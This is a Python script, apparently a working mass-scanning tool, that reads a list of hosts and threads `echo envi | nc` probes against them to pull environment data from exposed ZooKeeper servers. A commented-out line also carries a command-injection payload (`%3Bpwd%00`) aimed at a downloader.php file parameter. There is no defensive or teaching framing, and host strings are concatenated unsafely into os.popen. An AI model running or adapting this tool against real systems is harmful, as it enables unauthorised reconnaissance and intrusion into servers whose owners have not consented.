import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'
file_path = Path(__file__).resolve().parent
result_path = file_path/'result.txt'


def exploit(ip_, index):
    try:
        if 'http' in ip_:
            return
        ip_ = ip_.replace(':', ' ')
        # url = ip_+'downloader.php?file=%3Bpwd%00.zip'
        # print(url)
        res = os.popen('echo envi | nc '+ip_).read()
        if 'envi is not executed' in res:
            return

        print(res)
        print(ip_)
        # res = requests.get(url, headers=headers, timeout=8, verify=False)
        # print(res, len(res.text))
        # print(ip_)
        # with result_path.open('a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url)


threads = []
with open(r'D:\Downloads\tmp\zookeeper.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 0
        end = start+10

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 't'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
